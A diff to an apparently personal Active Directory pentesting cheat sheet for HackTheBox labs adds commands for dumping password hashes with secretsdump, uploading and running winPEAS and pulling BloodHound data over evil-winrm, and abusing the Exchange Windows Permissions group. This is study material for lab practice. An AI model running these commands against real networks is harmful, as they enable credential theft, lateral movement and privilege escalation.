@@ -43,6 +43,7 @@ crackmapexec smb <IP> -u <user> -p <password> --shares  # Check for SMB shares t
 #### secretsdump
 
 ```bash
+secretsdump.py htb.local/<username>@<IP>
 secretsdump.py htb.local/<username>:<password>@<IP>
 # Grab the hashes then attempt to crack or pass the hash
 # Pass the hash
@@ -72,6 +73,23 @@ Get-NetGroup  # Get groups
 Get-NetUser -SPN | ?{$_.memberof -match 'Domain Admins'}  # Get Kerberoastable user from a specified group
 ```
 
+## evil-winrm
+
+#### Upload File to Target
+
+```bash
+# From compromised target
+Evil-WinRM PS C:\Users\FSmith\Documents> upload winPEAS.exe
+Evil-WinRM PS C:\Users\FSmith\Documents> .\winPEAS.exe
+```
+
+#### Download From from Target
+
+```bash
+# From compromised target
+Evil-WinRM PS C:\Users\FSmith\Documents> download 123_BloodHound.zip
+```
+
 ## Bloodhound / Sharphound
 
 ### Sharphound
@@ -89,7 +107,7 @@ Run Bloodhound (and neo4j) then import zip file created by Sharphound
 
 ```bash
 # Run neo4j first
-neo4j console
+sudo neo4j console
 # Run Bloodhound
 bloodhound --no-sandbox
 
@@ -101,7 +119,7 @@ bloodhound --no-sandbox
 net user <username> <password> /add/ domain
 net group "Exchange Windows Permissions"  # Check for group members
 net group "Exchange Windows Permissions" /add <username>  # Add user to group in quotes
-# Then back in Bloodhound, right click group added and look at Abuse Info.
+# Then back in Bloodhound, right click group added (graph line) and look at Abuse Info.
 # Will most likely use PowerView for the Abuse
 ```
 
